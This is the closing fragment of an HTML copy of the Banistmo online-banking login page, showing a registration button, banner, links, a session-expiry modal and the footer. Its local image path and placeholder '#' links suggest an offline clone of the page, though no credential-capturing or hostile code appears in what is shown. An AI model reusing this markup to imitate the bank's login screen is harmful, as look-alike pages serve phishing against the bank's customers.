                                                   <div _ngcontent-mgc-c135="" class="row justify-content-center mt-3">
                                                      <!---->
                                                      <div _ngcontent-mgc-c135="" class="col-6">
                                                         <app-button _ngcontent-mgc-c135="" id="btn_ContinueRegister" type="primary-yellow" _nghost-mgc-c56="">
                                                            <button _ngcontent-mgc-c56="" class="btn primary-yellow" type="button" id="btn_ContinueRegister" disabled="">
                                                               Continuar <!---->
                                                            </button>
                                                         </app-button>
                                                      </div>
                                                   </div>
                                                
                                                   <!---->
                                                </app-step-one-register>
                                                <!----><!----><!---->
                                             </div>
                                          </div>
                                       </app-tab>
                                    </app-tabs>
                                 </div>
                              </app-card>
                              <!---->
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div _ngcontent-mgc-c137="" class="p-0 container-fluid d-none d-md-block">
                  <app-carousel-banner _ngcontent-mgc-c137="" class="carousel-banner" _nghost-mgc-c58="" id="idBannerLogin">
                     <div _ngcontent-mgc-c58="" class="main-container">
                        <div _ngcontent-mgc-c58="" class="carousel-banner">
                           <div _ngcontent-mgc-c58="" class="banner-container container"><a _ngcontent-mgc-c58="" href="#"><img _ngcontent-mgc-c58="" class="img-fluid" src="img/524930130.png"></a></div>
                        </div>
                     </div>
                  </app-carousel-banner>
                  <!---->
               </div>
               <div _ngcontent-mgc-c137="" class="secondary-container d-none d-md-block">
                  <div _ngcontent-mgc-c137="" class="information-container container">
                     <div _ngcontent-mgc-c137="" class="row justify-content-xl-end justify-content-md-center inner-secondary-container">
                        <div _ngcontent-mgc-c137="" class="col-md-8 text-center">
                           <app-subtitle _ngcontent-mgc-c137="" _nghost-mgc-c71="">
                              <h2 _ngcontent-mgc-c71="">Conoce también:</h2>
                           </app-subtitle>
                           <div _ngcontent-mgc-c137="" class="row ml-5">
                              <div _ngcontent-mgc-c137="" class="col-6 text-left">
                                 <app-secondary-link _ngcontent-mgc-c137="" icon="banistmo-cash-contribution" _nghost-mgc-c69="">
                                    <div _ngcontent-mgc-c69="" class="secondary-link"><i _ngcontent-mgc-c69="" class="banistmo-cash-contribution icon-left"></i><a _ngcontent-mgc-c69=""  href="#">Tarifas</a><i _ngcontent-mgc-c69="" class="fas fa-plus icon-right"></i></div>
                                 </app-secondary-link>
                                 <!---->
                              </div>
                              <div _ngcontent-mgc-c137="" class="col-6 text-left">
                                 <app-secondary-link _ngcontent-mgc-c137="" icon="banistmo-channels" _nghost-mgc-c69="">
                                    <div _ngcontent-mgc-c69="" class="secondary-link"><i _ngcontent-mgc-c69="" class="banistmo-channels icon-left"></i><a _ngcontent-mgc-c69=""  href="#">Servicios</a><i _ngcontent-mgc-c69="" class="fas fa-plus icon-right"></i></div>
                                 </app-secondary-link>
                                 <!---->
                              </div>
                           </div>
                           <div _ngcontent-mgc-c137="" class="row ml-5">
                              <div _ngcontent-mgc-c137="" class="col-6 text-left">
                                 <app-secondary-link _ngcontent-mgc-c137="" icon="fal fa-map-marker-alt" _nghost-mgc-c69="">
                                    <div _ngcontent-mgc-c69="" class="secondary-link"><i _ngcontent-mgc-c69="" class="fa-map-marker-alt fal icon-left"></i><a _ngcontent-mgc-c69=""  href="#">Sucursales</a><i _ngcontent-mgc-c69="" class="fas fa-plus icon-right"></i></div>
                                 </app-secondary-link>
                                 <!---->
                              </div>
                              <div _ngcontent-mgc-c137="" class="col-6 text-left">
                                 <app-secondary-link _ngcontent-mgc-c137="" icon="banistmo-news" _nghost-mgc-c69="">
                                    <div _ngcontent-mgc-c69="" class="secondary-link"><i _ngcontent-mgc-c69="" class="banistmo-news icon-left"></i><a _ngcontent-mgc-c69=""  href="#">Noticias</a><i _ngcontent-mgc-c69="" class="fas fa-plus icon-right"></i></div>
                                 </app-secondary-link>
                                 <!---->
                              </div>
                           </div>
                           <app-outline-button _ngcontent-mgc-c137="" icon="fal fa-mouse-pointer" _nghost-mgc-c66=""><a _ngcontent-mgc-c66="" href="#"><button _ngcontent-mgc-c66="" class="btn-outline" id=""> Conoce como utilizar la Banca en Línea </button></a></app-outline-button>
                           <!---->
                        </div>
                     </div>
                  </div>
               </div>
               <app-modal _ngcontent-mgc-c137="" id="modal_inactivity" class="modalTitle" _nghost-mgc-c63="">
                  <div _ngcontent-mgc-c63="" class="modal-container" id="modal_inactivity" style="z-index: 3000;">
                     <div _ngcontent-mgc-c63="" class="centered">
                        <div _ngcontent-mgc-c63="" class="modal-content">
                           <div _ngcontent-mgc-c63="" class="row modal-header align-items-center">
                              <!---->
                              <div _ngcontent-mgc-c63="" class="row header-title">
                                 <h2 _ngcontent-mgc-c63="" id="">Tu sesión ha expirado</h2>
                              </div>
                              <!---->
                           </div>
                           <!---->
                           <div _ngcontent-mgc-c63="" class="modal-body">
                              <div _ngcontent-mgc-c137="" class="modal-body align-items-center text-center">
                                 <p _ngcontent-mgc-c137="" class="session-message"> Tu sesión ha expirado por inactividad. </p>
                                 <div _ngcontent-mgc-c137="" class="row justify-content-center actions">
                                    <div _ngcontent-mgc-c137="" class="button-container">
                                       <app-button _ngcontent-mgc-c137="" id="btn_modalSaveButton_inactivity" type="primary-yellow" _nghost-mgc-c56="">
                                          <button _ngcontent-mgc-c56="" class="btn primary-yellow" type="button" id="btn_modalSaveButton_inactivity">
                                             Continuar <!---->
                                          </button>
                                       </app-button>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </app-modal>
            </div>
            <app-footer-external _ngcontent-mgc-c137="" class="footer" _nghost-mgc-c60="">
               <footer _ngcontent-mgc-c60="" class="isOption">
                  <div _ngcontent-mgc-c60="" class="container pt-3 pb-3">
                     <div _ngcontent-mgc-c60="" class="contact-information text-center">
                        <div _ngcontent-mgc-c60="" class="contact-telephone"><i _ngcontent-mgc-c60="" class="footer-icon fal fa-phone"></i> Sucursal Teléfonica: (507) 306-4700 </div>
                        <div _ngcontent-mgc-c60="" class="info-legal">Copyright Banistmo S.A. 2023</div>
                     </div>
                  </div>
               </footer>
            </app-footer-external>
           
         </app-pages-login>
         <!---->
      </app-root>
     
      
   </body>
</html>